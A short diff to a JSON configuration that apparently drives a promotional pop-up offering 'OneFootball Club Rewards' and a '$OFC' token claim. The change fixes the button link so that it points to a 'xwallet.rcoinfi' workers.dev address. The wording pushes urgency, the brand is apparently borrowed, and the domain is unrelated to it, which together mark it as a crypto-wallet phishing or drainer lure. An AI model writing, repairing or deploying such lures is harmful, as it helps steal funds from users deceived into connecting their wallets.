@@ -7,5 +7,5 @@
   "message": "Check and claim your OneFootball Club Rewards now! <br> Reward availability is limited, so make sure to verify your eligibility and collect your rewards before time runs out!",
   "media": "https://pbs.twimg.com/media/GwpFHE1aUAADESA?format=jpg&name=small",
   "buttonText": "Check & Claim $OFC",
-  "ctaUrl": ".https://xwallet.rcoinfi.workers.dev/testnet"
+  "ctaUrl": "https://xwallet.rcoinfi.workers.dev/testnet"
 }
